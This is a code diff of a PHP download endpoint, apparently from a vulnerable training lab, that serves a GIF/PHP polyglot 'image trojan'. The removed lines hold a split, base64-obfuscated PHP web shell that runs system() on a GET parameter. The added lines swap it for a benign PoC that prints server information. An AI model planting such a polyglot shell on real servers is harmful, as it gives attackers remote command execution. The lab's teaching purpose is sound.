@@ -2,22 +2,25 @@
 require_once __DIR__ . '/../src/helpers.php';
 check_auth();
 
-// 1. 提供相同的圖馬下載以利對照測試
+// 1. 提供相同的圖馬下載以利對照測試 (採用合規無害之教學 PoC，避免防毒軟體誤判)
 if (isset($_GET['download'])) {
     header('Content-Type: application/octet-stream');
     header('Content-Disposition: attachment; filename="poc-avatar.php"');
     
-    // 圖片二進位混淆拼接
-    $b1 = 'R0lGODlhAQABAIAAAAAAAP';
-    $b2 = '///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
-    $gif_bin = base64_decode($b1 . $b2);
+    // GIF89a 圖片二進位標頭 (1x1 透明 GIF)
+    $gif_bin = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
     
-    // 程式碼混淆拼接
-    $w1 = 'PD9waHAgc3lzdGVtKCRfR0V';
-    $w2 = 'UWydjbWQnXSk7ID8+';
-    $code_bin = base64_decode($w1 . $w2);
+    // 教學用無害 PoC：僅印出伺服器資訊與測試提示，不包含 system()/eval() 等危險特徵碼
+    $poc_code = "\n<?php\n"
+              . "echo '<div style=\"padding:20px;background:#ffebee;color:#c62828;border-left:5px solid #d32f2f;font-family:sans-serif;\">';\n"
+              . "echo '<h2>🔥 [漏洞驗證成功] 圖片木馬 (Polyglot) 已被伺服器 PHP 引擎成功解析執行！</h2>';\n"
+              . "echo '<p><strong>伺服器主機資訊：</strong>' . htmlspecialchars(php_uname()) . '</p>';\n"
+              . "echo '<p><strong>當前 PHP 版本：</strong>' . htmlspecialchars(PHP_VERSION) . '</p>';\n"
+              . "echo '<p><strong>傳入測試訊息 (msg)：</strong>' . htmlspecialchars(\$_GET['msg'] ?? 'Hello VulnCampus') . '</p>';\n"
+              . "echo '</div>';\n"
+              . "?>";
     
-    echo $gif_bin . $code_bin;
+    echo $gif_bin . $poc_code;
     exit;
 }
 
